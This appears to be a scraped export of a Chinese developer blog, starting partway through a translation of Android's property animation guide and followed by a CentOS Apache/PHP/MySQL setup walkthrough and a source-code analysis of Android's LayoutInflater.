android.view.animation中，因此你也可以在属性动画中使用这些interpolator。下面的表格描述了属性动画的主要组件。Animator类提供了创建动画的基础结构。一般情况下你并不需要直接使用这个类，因为它只提供了极少数的功能，因此这个类一般用于被继承。下面是一些继承自Animator的子类： 表1：Animators Class 描述 ValueAnimator 属性动画的主要时间引擎，用于计算动画执行的属性值。它拥有计算动画属性值的所有关键功能，还包含每个动画时序详细信息、关于动画是否重复的信息、接收事件更新的监听器和设置自定义计算类型的能力。在属性动画中有两个关键步骤：计算出每一帧动画的属性值，和把这些值设置到相应的对象和属性上。 ValueAnimator并没有执行第二步，因此你必须监听通过 ValueAnimator计算得出的更新的属性值，然后通过自己的逻辑把属性值设置到你想要执行动画的对象上。查看利用ValueAnimator执行动画（ Animating with ValueAnimator）章节可以获取更多信息。 ObjectAnimator 一个ValueAnimator的子类，允许你设置执行动画的目标对象和属性值。当在动画过程中，这个类计算出一个新的属性值时它会自动更新。大部分时间你会更倾向于使用ObjectAnimator，因为它使得在目标对象上执行属性动画这个过程更简单。然而，有时候你还是不得不直接使用ValueAnimator，因为ObjectAnimator有一些些限制，比如说它需要在目标对象中定义明确的获取对象属性的方法 AnimatorSet 提供一种把多个动画组合到一起的机制，使得它们可以以一种特定的关系运行。你可以让多个动画同时执行，顺序执行或延迟特定时间后执行。查看利用AnimatorSet编排设置动画（ Choreographing multiple animations with Animator Sets）获取更多信息。 Evaluator告诉属性动画如何去计算一个给定的属性。它们利用 Animator类提供的时间数据、属性的起始和结束值来计算出某一时刻的属性值。属性动画提供了以下Evaluator：表2：Evaluators Class/Interface 描述 IntEvaluator 默认的用于计算int类型属性值的evaluator FloatEvaluator 默认的用于计算float类型属性值的evaluator ArgbEvaluator 默认的用于计算以16进制表示的颜色属性值的evaluator TypeEvaluator 一个允许你创建自己的evaluator的接口。如果你想要执行动画的属性值并不是int、float或颜色类型，那么你就必须实现TypeEvaluator接口来指明如何计算动画对象的属性值。如果你想要以不同的方式计算int、float或颜色类型，你也可以为它们指定一个习惯的TypeEvaluator。查看使用TypeEvaluator（Using a TypeEvaluator）来获取更多关于TypeEvaluator的信息 一个time interpolator决定了计算动画的值如何与时间相关（译者注：即决定动画执行的速率）。例如，你可以指定整个动画线性执行，意味着动画在整个时间内均匀地移动，或者你也可以指定动画非线性的执行，例如，加速开始减速结束。表3描述了包含在android.view.animation中的 interpolator。如果提供的 interpolator并没有能满足你的需求的，可以通过实现TimeInterpolator接口来实现自己的interpolator。查看使用interpolator（Using interpolators）来获取更多信息。表3：interpolator class/Interface 描述 AccelerateDecelerateInterpolator 加速开始减速结束的Interpolator AccelerateInterpolator 缓慢开始，然后不断加速的Interpolator AnticipateInterpolator 开始时先往后再往前的Interpolator AnticipateOvershootInterpolator 开始时先往后再往前，结束时先超过结束值再返回的Interpolator BounceInterpolator 在结尾回弹的Interpolator CycleInterpolator 重复动画特定圈数的Interpolator DecelerateInterpolator 快速开始，然后不断减速的Interpolator LinearInterpolator 速度恒定均匀不变的Interpolator OvershootInterpolator 结束时先超过结束值再返回的Interpolator TimeInterpolator 允许你自定义Interpolator的接口 使用ValueAnimator执行动画（ Animating with ValueAnimator）ValueAnimator类让你通过指定一系列int、float或color值和执行时间来执行某些类型值的动画。你可以通过工厂方法： ofInt(), ofFloat(), or ofObject()来构造一个ValueAnimator。例如： 123ValueAnimator animation = ValueAnimator.ofFloat(0f, 1f);animation.setDuration(1000);animation.start(); 在这段代码中，当start方法被调用时，ValueAnimator开始执行一个将float从0变为1，持续时间为1000ms的动画。通过以下代码，你也可以执行一个指定类型的值的动画： 123ValueAnimator animation = ValueAnimator.ofObject(new MyTypeEvaluator(), startPropertyValue, endPropertyValue);animation.setDuration(1000);animation.start(); 在这段代码中，当start方法被调用时，ValueAnimator开始执行一个，通过MyTypeEvaluator提供的逻辑将startPropertyValue变为endPropertyValue的，持续时间为1000ms的动画。 然而，在上面的代码中，我们都没有真正影响改变一个对象，因为ValueAnimator并不会直接在对象或属性上操作。因此你可以通过注册合适的ValueAnimator的监听器，在动画过程中，比如某个帧更新时，修改某个对象的值。在实现监听器时，你可以通过getAnimatedValue方法来获取特定帧计算出来的属性值。想要了解更多关于监听的消息，可以查看动画监听器（Animation Listeners）章节。 使用ObjectAnimator执行动画（ Animating with ObjectAnimator）ObjectAnimator是ValueAnimator的子类，它拥有来自ValueAnimator的计时引擎和计算属性值的能力，因此它可以对一个特定的对象执行动画。它使得我们让对象执行动画变得更简单，因为你不再需要实现 ValueAnimator.AnimatorUpdateListener，它会自动更新对象的属性值。 创建ObjectAnimator和ValueAnimator类似，不过你另外需要指明动画执行的对象和属性值（以字符串的形式）： 123ObjectAnimator anim = ObjectAnimator.ofFloat(foo, \"alpha\", 0f, 1f);anim.setDuration(1000);anim.start(); 为了让ObjectAnimator可以正确地更新对象的属性值，你必须完成以下事情： 你要执行动画的对象属性值必须要有setter方法（用驼峰状格式编写），形式类似于set()（译者注：如上面的例子就是setAlpha）。由于ObjectAnimator会在动画过程中自动更新属性的值，因此必须要有setter方法让ObjectAnimator可以更新属性值。例如，属性的名称为foo，那么你就需要拥有一个setFoo（）的方法。如果你并没有编写setter方法，那么你有如下三种选择： 如果你有权限，为你的类添加setter方法 使用包装类来添加setter方法 使用ValueAnimator代替 如果你在构造ObjectAnimator方法的参数values…（译者注：一个不定长参数，表示属性值的变化过程）中只填入了一个值，那么它就会被当做动画结束时的属性值。因此，你执行动画的对象属性值必须要有一个getter方法来获取动画开始时的属性值。你的getter方法必须是get()的形式。例如，属性的名称为foo，那么你就需要拥有一个getFoo（）的方法。 你的属性值的getter（如果需要的话）和setter方法必须操作同一种类型。例如，如果你使用下列代码来构造ObjectAnimator，那么你就必须有targetObject.setPropName(float) 和 targetObject.getPropName(float)两个方法： 1ObjectAnimator.ofFloat(targetObject, \"propName\", 1f) 当你为某些对象或属性执行动画的时候，你可能需要为View对象调用 invalidate()方法，强制要求屏幕以新的属性值重绘View对象。你可以在回调函数 onAnimationUpdate()中调用此过程。例如，对一个Drawable 对象执行颜色属性动画时，只有当该对象重绘时，颜色才会被更新到屏幕上（译者注：因此需要显示调用 invalidate()方法）。而所有View中的setter方法，例如 setAlpha() 和 setTranslationX()，会自动以合适的方式重绘View，因此此时你不需要调用 invalidate()方法。查看动画监听器（ AnimationListeners）来获取更多关于动画监听器的信息 利用AnimatorSet编排设置动画（ Choreographing multiple animations with Animator Sets）在大多数情况下，一个动画是否执行取决于其他某个动画是否已经开始或结束。Android系统允许你把多个动画包装进一个AnimatorSet，那么你就可以指定动画是否同时执行，还是顺序执行，还是延迟一段时间后执行。你也可以使用AnimatorSet互相组合。下面的代码将执行以下动画效果： 播放 bounceAnim 同时播放 squashAnim1, squashAnim2, stretchAnim1, 和 stretchAnim2 播放 bounceBackAnim 播放 fadeAnim 1234567891011AnimatorSet bouncer = new AnimatorSet();bouncer.play(bounceAnim).before(squashAnim1);bouncer.play(squashAnim1).with(squashAnim2);bouncer.play(squashAnim1).with(stretchAnim1);bouncer.play(squashAnim1).with(stretchAnim2);bouncer.play(bounceBackAnim).after(stretchAnim2);ValueAnimator fadeAnim = ObjectAnimator.ofFloat(newBall, \"alpha\", 1f, 0f);fadeAnim.setDuration(250);AnimatorSet animatorSet = new AnimatorSet();animatorSet.play(bouncer).before(fadeAnim);animatorSet.start(); 动画监听器（Animation Listeners）你可以利用下面介绍的监听器在动画执行的过程中监听某些重要的事件。 Animator.AnimatorListener onAnimationStart()：当动画开始时被调用 onAnimationEnd()：当动画结束时被调用 onAnimationRepeat()：当动画开始重复时被调用 onAnimationCancel()：当动画被取消时调用。被取消的动画也会调用 onAnimationEnd，无论它们是如何结束的 ValueAnimator.AnimatorUpdateListener onAnimationUpdate()：动画每一帧都会调用。可以通过监听此事件来获取 ValueAnimator计算出来的属性值，在 ValueAnimator上调用getAnimatedValue()方法可获取计算出来的值。如果你使用 ValueAnimator，你就得实现这个监听器 取决于你执行动画的对象与属性，你可能需要在一个View上调用 invalidate方法，以使得屏幕使用新的属性值来刷新视图。例如，执行Drawable对象的颜色属性动画，当且仅当屏幕重绘视图时，动画的效果才显示出来。所有View中的setter方法，例如 setAlpha() 和 setTranslationX()，会自动以合适的方式重绘View，因此此时你不需要调用 invalidate()方法。如果你不想实现全部的回调方法，你可以继承AnimatorListenerAdapter类来代替实现Animator.AnimatorListener接口。AnimatorListenerAdapter类为所有的方法提供了默认的空实现，你可以选择需要的方法进行重写。例如，下面是一个利用 AnimatorListenerAdapter来仅重写onAnimationEnd方法的例子： 123456ValueAnimatorAnimator fadeAnim = ObjectAnimator.ofFloat(newBall, \"alpha\", 1f, 0f);fadeAnim.setDuration(250);fadeAnim.addListener(new AnimatorListenerAdapter() &#123;public void onAnimationEnd(Animator animation) &#123; balls.remove(((ObjectAnimator)animation).getTarget());&#125; 为ViewGroups的布局变动添加动画（Animating Layout Changes to ViewGroups）属性动画系统也提供了为ViewGroup布局变动添加动画的能力。你可以使用LayoutTransition 类来为你的布局变动添加动画。当你添加或删除ViewGroup中的View，或将这些View可视状态变为可见、不可见或消失时，可以让它们执行一些出现或消失的动画。而剩下的View也可以执行动画来移动到对应的位置上。你可以通过调用 LayoutTransition的setAnimator方法，传入一个Animator对象与下列 LayoutTransition的常数来定义某些动画效果： APPEARING：当一个条目在容器中出现时，执行动画 CHANGE_APPEARING：当一个条目在容器中出现，引起其他条目变化时，执行动画 DISAPPEARING：当一个条目从容器中消失时，执行动画 CHANGE_DISAPPEARING：当一个条目从容器中消失，引起其他条目变化时，执行动画 你可以选择为这四种事件使用自己定制的动画效果来实现自定义布局变化，也可以使用系统默认的效果。 在xml中只需设置android:animateLayoutchanges属性即可简单开启布局动画： 123456&lt;LinearLayout android:orientation=\"vertical\" android:layout_width=\"wrap_content\" android:layout_height=\"match_parent\" android:id=\"@+id/verticalContainer\" android:animateLayoutChanges=\"true\" /&gt; 只要该属性设置为true，那么上述四种动画效果都会拥有。 使用TypeEvaluator（Using a TypeEvaluator）如果你想要为一个Android系统未知的类型（译者注：即自定义类型）来设置动画，你可以通过实现TypeEvaluator接口来创建自己的evaluator。目前Android已知的类型有int，float和颜色类型，它们对应的evaluator为IntEvaluator、FloatEvaluator和ArgbEvaluator.在TypeEvaluator接口中，只有一个方法需要实现，即 evaluate()方法。该方法使你可以为动画某一帧计算出一个合适的属性值。以下为FloatEvaluator的实现： 1234567public class FloatEvaluator implements TypeEvaluator &#123; public Object evaluate(float fraction, Object startValue, Object endValue) &#123; float startFloat = ((Number) startValue).floatValue(); return startFloat + fraction * (((Number) endValue).floatValue() - startFloat); &#125;&#125; 备注：当 ValueAnimator (或 ObjectAnimator)运作时，它会根据执行时间计算出一个elapsed fraction值（一个0到1之间的值），然后通过这个值在 interpolator中计算出一个fraction值，并传入TypeEvaluator的evaluate方法的参数中。因此当你射击evaluate方法时无需顾及 interpolator。 使用interpolator（Using interpolators）一个interpolator负责定义属性值如何以关于时间的函数被计算出来。例如，你可以指定动画线性的执行，这就意味着动画在整个执行时间里均匀地移动，或者你可以指定动画非线性地执行，在动画开头或结尾加速或减速。在动画系统中的Interpolator接收一个fraction参数用于表示执行时间的百分比。Interpolator通过返回一个新的fraction表示属性值执行的百分比，以此来实现某种动画效果。Android系统已经在android.view.animation package中定义了一系列的interpolator。如果系统定义的interpolator没有能满足你的需求，你也可以自己实现TimeInterpolator接口自己创建Interpolator。作为例子，我们来看看AccelerateDecelerateInterpolator和LinearInterpolator的实现。LinearInterpolator对于传入的fraction没有更改，而AccelerateDecelerateInterpolator使得返回值在开头加速增长而在结尾减速。它们的代码如下：AccelerateDecelerateInterpolator 123public float getInterpolation(float input) &#123; return (float)(Math.cos((input + 1) * Math.PI) / 2.0f) + 0.5f;&#125; LinearInterpolator 123public float getInterpolation(float input) &#123; return input;&#125; 下面的表格显示了它们的返回值在1000ms中的变化： 时间（ms） LinearInterpolator返回值 AccelerateDecelerateInterpolator返回值 0 0 0 200 0.2 0.1 400 0.4 0.345 600 0.6 0.8 800 0.8 0.9 1000 1 1 正如表格所示，LinearInterpolator以相等的速度在改变返回值，每200ms增加0.2.而AccelerateDecelerateInterpolator在200ms到600ms时增长比LinearInterpolator快，而在600ms到1000ms时增长比LinearInterpolator慢。 指定关键帧（Specifying Keyframes）一个Keyframe对象包含了一对时间与属性值，它允许你定义动画中一个特定的时间里的特定状态。每个关键帧都拥有自己的 interpolator，用来控制前一关键帧到该关键帧时间间隔内的动画的行为。你可以使用工厂方法：ofInt(), ofFloat(), 或 ofObject()，传入合适的参数来实例化关键帧。然后你需要调用ofKeyframe()工厂方法来构造PropertyValuesHolder对象。当你有了这个对象后，你可以通过传入该对象和一个要执行动画的对象来构造一个属性动画。下面的代码片段演示了如何实现这种效果： 123456Keyframe kf0 = Keyframe.ofFloat(0f, 0f);Keyframe kf1 = Keyframe.ofFloat(.5f, 360f);Keyframe kf2 = Keyframe.ofFloat(1f, 0f);PropertyValuesHolder pvhRotation = PropertyValuesHolder.ofKeyframe(\"rotation\", kf0, kf1, kf2);ObjectAnimator rotationAnim = ObjectAnimator.ofPropertyValuesHolder(target, pvhRotation)rotationAnim.setDuration(5000ms); 为View执行动画（Animating Views）属性动画系统允许View对象执行流线型的动画，与View动画相比也有一定的优点。View动画通过改变View对象的绘制来实现对它们的转换。这些都是交给持有这些View的容器来实现的，因为这些View自身并没有相关的属性可以操作。这就导致了View对象执行了动画，但对View对象来说并没有任何影响。这就导致了一些问题，例如一个对象的属性还出现在它原来的位置，但在屏幕上它已经被绘制到了别的地方。在Android3.0中，属性动画与对应的getter和setter方法的加入将消除这些问题。属性动画可以通过实际更改View对象的属性来使它们执行动画。此外，当一个View的属性被改变时，它也会自动调用invalidate方法来刷新屏幕视图。在View类中方便属性动画执行的属性有： translationX 和 translationY：这两个属性作为View由容器设置的left和top坐标的偏移量，控制View的坐标 rotation, rotationX, 和 rotationY：这些属性用于控制View在2D或3D围绕中心点的旋转 scaleX 和 scaleY：这些属性用于控制View围绕中心点的2D平面的缩放 pivotX 和 pivotY：这些属性用于控制中心点的位置。中心点与View的旋转和缩放有关。默认情况下，中心点是对象的中心 x 和 y：这些事描述View在它的容器中最终坐标的值。它是left和top与translationX 和 translationY得和 alpha：代表View的透明度。默认值为1（不透明），0代表完全透明（不可见） 要在一个View对象属性上执行动画，例如它的颜色或旋转值，你只需要构造一个属性动画，再指明要执行动画的属性即可。例如： 1ObjectAnimator.ofFloat(myView, \"rotation\", 0f, 360f); 利用ViewPropertyAnimator执行动画（Animating with ViewPropertyAnimator）ViewPropertyAnimator提供了一种简单的方法，让我们可以在一个底层的Animator对象上并行执行多个属性动画效果。它的工作与 ObjectAnimator很像，因为它也会实际更改View的属性值，但它在同时执行多个属性值变化时会更有效率。此外，使用 ViewPropertyAnimator来编写的代码会显得更简洁和易于阅读。下面的代码片段显示了，当同时执行一个View对象x和y属性动画时，利用多个 ObjectAnimator、只利用一个 ObjectAnimator和利用 ViewPropertyAnimator的不同： 多个 ObjectAnimator对象 12345ObjectAnimator animX = ObjectAnimator.ofFloat(myView, \"x\", 50f);ObjectAnimator animY = ObjectAnimator.ofFloat(myView, \"y\", 100f);AnimatorSet animSetXY = new AnimatorSet();animSetXY.playTogether(animX, animY);animSetXY.start(); 一个 ObjectAnimator 123PropertyValuesHolder pvhX = PropertyValuesHolder.ofFloat(\"x\", 50f);PropertyValuesHolder pvhY = PropertyValuesHolder.ofFloat(\"y\", 100f);ObjectAnimator.ofPropertyValuesHolder(myView, pvhX, pvyY).start(); ViewPropertyAnimator 1myView.animate().x(50f).y(100f); 在XML中声明动画（Declaring Animations in XML）属性动画系统允许你通过在xml上声明，而不是编码的方式来构造属性动画。通过在xml中定义你的动画，你可以在多个Activity中实现动画的复用，也更容易修改动画的序列。为了把使用属性动画API的xml文件与使用遗留的 view animation框架的xml文件区分开来，从Android3.1起，你应该把属性动画的xml文件保存在 res/animator/目录下。属性动画的类对应着下面的xml标签： ValueAnimator - &lt;animator&gt; ObjectAnimator - &lt;objectAnimator&gt; AnimatorSet - &lt;set&gt; 下面的例子顺序地执行两个动画集合，第一个集合由两个ObjectAnimator 同时执行： 123456789101112131415161718&lt;set android:ordering=\"sequentially\"&gt; &lt;set&gt; &lt;objectAnimator android:propertyName=\"x\" android:duration=\"500\" android:valueTo=\"400\" android:valueType=\"intType\"/&gt; &lt;objectAnimator android:propertyName=\"y\" android:duration=\"500\" android:valueTo=\"300\" android:valueType=\"intType\"/&gt; &lt;/set&gt; &lt;objectAnimator android:propertyName=\"alpha\" android:duration=\"500\" android:valueTo=\"1f\"/&gt;&lt;/set&gt; 想要让动画执行起来，你必须在代码中把xml实例化为一个 AnimatorSet对象，然后在执行动画前把所有的目标对象设置好。调用 setTarget方法可以很方便的为 AnimatorSet的所有子动画设置一个目标对象。下面的代码告诉了你怎么做： 1234AnimatorSet set = (AnimatorSet) AnimatorInflater.loadAnimator(myContext, R.anim.property_animator);set.setTarget(myObject);set.start();","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"view","slug":"view","permalink":"https://superxlcr.github.io/tags/view/"}]},{"title":"CentOS 配置 apache+php+mysql","slug":"CentOS-配置-apache-php-mysql","date":"2016-05-23T03:32:17.000Z","updated":"2020-05-11T07:23:44.660Z","comments":true,"path":"2016/05/23/CentOS-配置-apache-php-mysql/","link":"","permalink":"https://superxlcr.github.io/2016/05/23/CentOS-配置-apache-php-mysql/","excerpt":"","text":"最近博主配置了自己的CentOS云服务器的php环境，期间遇到了不少困难，查询了许多资料才得以解决，在此写下博客以记录。 Apacheapache默认在CentOS中已经安装了，输入以下指令可以查看版本： 1apachectl -v 如果提示没安装apache的话使用yum安装即可 Mysql首先我们尝试使用yum安装： 123yum install mysqlyum install mysql-serveryum install mysql-devel 然而如果系统是CentOS 7的话，会发现如下错误：mysql与mysql-devel均安装成功，mysql-server安装失败。 12No package mysql-server available.Error: Nothing to do 根据网上查询的资料得知：CentOS 7 版本将MySQL数据库软件从默认的程序列表中移除，用mariadb代替了。有两种解决办法： 安装mariadb 官网下载安装mysql-server 安装mariadbMariaDB数据库管理系统是MySQL的一个分支，主要由开源社区在维护，采用GPL授权许可。开发这个分支的原因之一是：甲骨文公司收购了MySQL后，有将MySQL闭源的潜在风险，因此社区采用分支的方式来避开这个风险。MariaDB的目的是完全兼容MySQL，包括API和命令行，使之能轻松成为MySQL的代替品。 使用yum安装mariadb： 1yum install mariadb-server mariadb 安装完成后，开启mariadb服务： 1systemctl start mariadb 就可以正常的使用mysql了： 1mysql -u root -p 官网下载安装mysql-server在合适的工作目录下下载文件并安装： 123wget http://dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpmrpm -ivh mysql-community-release-el7-5.noarch.rpmyum install mysql-community-server 安装完成后启动mysql服务： 1service mysqld restart 然后就可以正常的使用mysql了（初次登陆没有密码）： 1mysql -u root 使用SQL设置密码： 1set password for &apos;root&apos;@&apos;localhost&apos; =password(&apos;password&apos;); php美国时间2014年11月13日，PHP开发团队，在「PHP 5.6.3 is available｜PHP: Hypertext Preprocessor」上公布了PHP5.6系的最新版本「PHP 5.6.3」。在最新的版本5.6.3不仅修改了多个Bug，并且修改了fileinfo模块里存在的安全漏洞。PHP团队推荐使用PHP5.6系列的用户，升级到最新版本5.6.3。 追加CentOS 6.5的epel及remi源： 12rpm -Uvh http://ftp.iij.ad.jp/pub/linux/fedora/epel/6/x86_64/epel-release-6-8.noarch.rpmrpm -Uvh http://rpms.famillecollet.com/enterprise/remi-release-6.rpm CentOS 7的源： 12yum install epel-releaserpm -ivh http://rpms.famillecollet.com/enterprise/remi-release-7.rpm 查看可安装的包： 1yum list --enablerepo=remi --enablerepo=remi-php56 | grep php yum源配置好了，下一步就安装PHP5.6： 1yum install --enablerepo=remi --enablerepo=remi-php56 php php-opcache php-devel php-mbstring php-mcrypt php-mysqlnd php-phpunit-PHPUnit php-pecl-xdebug php-pecl-xhprof 安装完后查看php版本： 123456[root@VM_120_39_centos ~]# php --versionPHP 5.6.21 (cli) (built: Apr 28 2016 07:39:37)Copyright (c) 1997-2016 The PHP GroupZend Engine v2.6.0, Copyright (c) 1998-2016 Zend Technologies with Zend OPcache v7.0.6-dev, Copyright (c) 1999-2016, by Zend Technologies with Xdebug v2.4.0, Copyright (c) 2002-2016, by Derick Rethans 安装完php后，我们需要配置apache的配置文件httpd.conf，以使apache支持php： 1vim /etc/httpd/conf/httpd.conf 首先找到AddType，添加如下二行： 12AddType application/x-httpd-php .phpAddType application/x-httpd-php-source .phps 然后定位至DirectoryIndex index.html，修改为： 1DirectoryIndex index.php index.html 重启apache服务： 1service httpd restart CentOS的apache网页目录在/var/www/html中，转到该目录下，新建文件index.php测试吧： 12345678&lt;?php$conn=mysql_connect('localhost','root',''); if ($conn) echo \"Connect Success...\"; else echo \"Connect Failure...\"; phpinfo();?&gt; 参考网页资料：Mysqlhttp://www.cnblogs.com/starof/p/4680083.htmlphp安装http://my.oschina.net/u/573270/blog/423238php配置http://jingyan.baidu.com/article/d5c4b52bec7d6bda560dc5fb.html","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://superxlcr.github.io/categories/操作系统/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://superxlcr.github.io/tags/linux/"},{"name":"操作系统","slug":"操作系统","permalink":"https://superxlcr.github.io/tags/操作系统/"}]},{"title":"Android之LayoutInflater探索","slug":"Android之LayoutInflater探索","date":"2016-05-21T03:56:09.000Z","updated":"2020-05-11T07:23:44.561Z","comments":true,"path":"2016/05/21/Android之LayoutInflater探索/","link":"","permalink":"https://superxlcr.github.io/2016/05/21/Android之LayoutInflater探索/","excerpt":"","text":"LayoutInflater是一个我们在Android编程中经常使用到的用于生成解析布局文件的类，在这篇博客中我们将探索LayoutInflater的相关知识。 获取LayoutInflater实例想要使用LayoutInflater，我们必须先获取它的实例，在Android中我们有如下两种方法： 1234// 方法一LayoutInflater LayoutInflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);// 方法二LayoutInflater LayoutInflater = LayoutInflater.from(context); 其实方法二只是方法一的包装而已，不过通常博主都会使用方法二，因为比较方便： 12345678public static LayoutInflater from(Context context) &#123; LayoutInflater LayoutInflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE); if (LayoutInflater == null) &#123; throw new AssertionError(\"LayoutInflater not found.\"); &#125; return LayoutInflater;&#125; LayoutInflater使用在获取了LayoutInflater的实例后，我们可以使用它来解析我们的布局了。在LayoutInflater中给出的解析函数有如下四种重载： 12345678// 布局索引号，父Viewinflate(int resource, ViewGroup root)// 包含布局内容的PULLxml解析器，父Viewinflate(XmlPullParser parser, ViewGroup root)// 布局索引号，父View，是否绑定到父Viewinflate(int resource, ViewGroup root, boolean attachToRoot)// 包含布局内容的PULLxml解析器，父View，是否绑定到父Viewinflate(XmlPullParser parser, ViewGroup root, boolean attachToRoot) LayoutInflater源码所有函数均返回一个View，由于前三项重载函数最后均会调用最后一项重载函数，因此在此我们分析最后一个重载函数。在此之前，先列出一些LayoutInflater中定义的标签常量： 12345private static final String TAG_MERGE = \"merge\";private static final String TAG_INCLUDE = \"include\";// blink特殊标签，具有闪烁的效果，这东西貌似在1994年左右诞生，所以叫TAG_1995？private static final String TAG_1995 = \"blink\";private static final String TAG_REQUEST_FOCUS = \"requestFocus\"; 重载的解析函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980public View inflate(XmlPullParser parser, ViewGroup root, boolean attachToRoot) &#123; synchronized (mConstructorArgs) &#123; final AttributeSet attrs = Xml.asAttributeSet(parser); // 用于实例化View的参数 Context lastContext = (Context)mConstructorArgs[0]; mConstructorArgs[0] = mContext; // 返回结果 View result = root; try &#123; // 查看起始节点是否为空 // Look for the root node. int type; while ((type = parser.next()) != XmlPullParser.START_TAG &amp;&amp; type != XmlPullParser.END_DOCUMENT) &#123; // Empty &#125; if (type != XmlPullParser.START_TAG) &#123; throw new InflateException(parser.getPositionDescription() + \": No start tag found!\"); &#125; final String name = parser.getName(); // 解析merge特殊标签 if (TAG_MERGE.equals(name)) &#123; if (root == null || !attachToRoot) &#123; throw new InflateException(\"&lt;merge /&gt; can be used only with a valid \" + \"ViewGroup root and attachToRoot=true\"); &#125; rInflate(parser, root, attrs, false); &#125; else &#123; // 解析blink特殊标签 // Temp is the root view that was found in the xml View temp; if (TAG_1995.equals(name)) &#123; temp = new BlinkLayout(mContext, attrs); &#125; else &#123; temp = createViewFromTag(root, name, attrs); &#125; ViewGroup.LayoutParams params = null; if (root != null) &#123; // Create layout params that match root, if supplied params = root.generateLayoutParams(attrs); if (!attachToRoot) &#123; // Set the layout params for temp if we are not // attaching. (If we are, we use addView, below) temp.setLayoutParams(params); &#125; &#125; // 开始解析子View // Inflate all children under temp rInflate(parser, temp, attrs, true); // We are supposed to attach all the views we found (int temp) // to root. Do that now. if (root != null &amp;&amp; attachToRoot) &#123; root.addView(temp, params); &#125; // Decide whether to return the root that was passed in or the // top view found in xml. if (root == null || !attachToRoot) &#123; result = temp; &#125; &#125; &#125; ... return result; &#125; &#125;&#125; 代码标有注释，一路过来应该不难看懂。在此我们不分析特殊的标签解析，因此我们的代码应该一路执行至第42行，调用了createViewFromTag方法： 123456789101112131415161718192021222324252627View createViewFromTag(View parent, String name, AttributeSet attrs) &#123; ... try &#123; View view; if (mFactory2 != null) view = mFactory2.onCreateView(parent, name, mContext, attrs); else if (mFactory != null) view = mFactory.onCreateView(name, mContext, attrs); else view = null; if (view == null &amp;&amp; mPrivateFactory != null) &#123; view = mPrivateFactory.onCreateView(parent, name, mContext, attrs); &#125; if (view == null) &#123; if (-1 == name.indexOf('.')) &#123; view = onCreateView(parent, name, attrs); &#125; else &#123; view = createView(name, null, attrs); &#125; &#125; if (DEBUG) System.out.println(\"Created view is: \" + view); return view; &#125; ...&#125; 该方法有多处调用了onCreateView或createView来生成解析的顶层View，onCreateView方法最终会调用createView方法，因此我们一起来看看createView方法： 12345678910111213141516171819202122232425262728293031323334353637public final View createView(String name, String prefix, AttributeSet attrs) throws ClassNotFoundException, InflateException &#123; // 缓存构造函数 Constructor&lt;? extends View&gt; constructor = sConstructorMap.get(name); Class&lt;? extends View&gt; clazz = null; try &#123; Trace.traceBegin(Trace.TRACE_TAG_VIEW, name); // 获取构造函数，并判断是否可以实例化View if (constructor == null) &#123; // Class not found in the cache, see if it's real, and try to add it clazz = mContext.getClassLoader().loadClass( prefix != null ? (prefix + name) : name).asSubclass(View.class); ... constructor = clazz.getConstructor(mConstructorSignature); sConstructorMap.put(name, constructor); &#125; ... // 传入View参数，第一项为Context，第二项为View参数 Object[] args = mConstructorArgs; args[1] = attrs; final View view = constructor.newInstance(args); // 为ViewStub对象设置LayoutInflater if (view instanceof ViewStub) &#123; // always use ourselves when inflating ViewStub later final ViewStub viewStub = (ViewStub) view; viewStub.setLayoutInflater(this); &#125; return view; &#125; ...&#125; 适当添加了注释，代码并不难看懂，主要是通过Java的反射机制实例化了对应的View，并通过缓存View的构造函数提高实例化速度。回到我们的inflate方法，第47行判断我们传入的root（即父View）是否为空，若不为空则生成对应的测量标准（因此当我们解析一个布局的时候一定要传入对应的父View，否则无法生成正确的测量标准将导致解析出来的布局大小不正确）。 再继续往下执行，在第59行代码调用了rInflate方法开始解析我们的布局顶层View的子View： 12345678910111213141516171819202122232425262728293031323334353637383940414243void rInflate(XmlPullParser parser, View parent, final AttributeSet attrs, boolean finishInflate) throws XmlPullParserException, IOException &#123; // 解析迭代次数 final int depth = parser.getDepth(); int type; while (((type = parser.next()) != XmlPullParser.END_TAG || parser.getDepth() &gt; depth) &amp;&amp; type != XmlPullParser.END_DOCUMENT) &#123; if (type != XmlPullParser.START_TAG) &#123; continue; &#125; final String name = parser.getName(); // 处理requestFocus标签 if (TAG_REQUEST_FOCUS.equals(name)) &#123; parseRequestFocus(parser, parent); &#125; else if (TAG_INCLUDE.equals(name)) &#123; // 处理include标签 if (parser.getDepth() == 0) &#123; throw new InflateException(\"&lt;include /&gt; cannot be the root element\"); &#125; parseInclude(parser, parent, attrs); &#125; else if (TAG_MERGE.equals(name)) &#123; // 处理merge标签 throw new InflateException(\"&lt;merge /&gt; must be the root element\"); &#125; else if (TAG_1995.equals(name)) &#123; // 处理blink标签 final View view = new BlinkLayout(mContext, attrs); final ViewGroup viewGroup = (ViewGroup) parent; final ViewGroup.LayoutParams params = viewGroup.generateLayoutParams(attrs); rInflate(parser, view, attrs, true); viewGroup.addView(view, params); &#125; else &#123; final View view = createViewFromTag(parent, name, attrs); final ViewGroup viewGroup = (ViewGroup) parent; final ViewGroup.LayoutParams params = viewGroup.generateLayoutParams(attrs); rInflate(parser, view, attrs, true); viewGroup.addView(view, params); &#125; &#125; if (finishInflate) parent.onFinishInflate();&#125; 有了注释该方法并不难懂，该方法会一直迭代调用自身直到xml文件解析完毕，是一个挺耗时的过程。回到我们的inflate方法，在第63行，我们判断root是否为空，若不为空且我们设定了布局需要绑定到父View（attachToRoot == true），那么我们的布局就会添加到父View中，并最终解析的返回结果为父View（第70行）；若为空或不绑定，则返回的结果为我们需要解析的布局的顶层View。 以下为LayoutInflater#inflate工作流程图： 